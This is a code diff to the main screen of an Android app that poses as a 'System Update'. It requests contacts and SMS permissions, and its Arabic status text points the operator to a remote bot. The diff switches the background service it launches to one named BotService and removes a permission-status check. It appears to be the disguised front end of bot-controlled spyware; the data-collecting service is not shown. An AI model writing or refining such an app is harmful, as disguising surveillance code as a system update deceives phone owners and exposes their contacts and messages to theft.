@@ -16,9 +16,6 @@ import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
     
-    private TextView tvStatus;
-    private Button btnPermissions;
-    
     private String[] permissions = {
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_SMS,
@@ -34,12 +31,11 @@ public class MainActivity extends AppCompatActivity {
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setPadding(50, 100, 50, 50);
         
-        tvStatus = new TextView(this);
-        tvStatus.setText("⚙️ System Update\n\nالخدمة تعمل في الخلفية\nارسل /help للبوت");
+        TextView tvStatus = new TextView(this);
+        tvStatus.setText("⚙️ System Update\n\nالخدمة تعمل\nارسل /help للبوت");
         tvStatus.setTextSize(16);
-        tvStatus.setPadding(0, 0, 0, 30);
         
-        btnPermissions = new Button(this);
+        Button btnPermissions = new Button(this);
         btnPermissions.setText("🔓 إعطاء الصلاحيات");
         btnPermissions.setOnClickListener(v -> {
             for (String permission : permissions) {
@@ -58,22 +54,6 @@ public class MainActivity extends AppCompatActivity {
         setContentView(layout);
         
         // بدء الخدمة
-        startService(new Intent(this, MainService.class));
-    }
-    
-    @Override
-    protected void onResume() {
-        super.onResume();
-        boolean allGranted = true;
-        for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                allGranted = false;
-                break;
-            }
-        }
-        if (allGranted) {
-            tvStatus.setText("✅ جميع الصلاحيات مفعلة\nالخدمة تعمل في الخلفية\nارسل /help للبوت");
-            btnPermissions.setEnabled(false);
-        }
+        startService(new Intent(this, BotService.class));
     }
 }
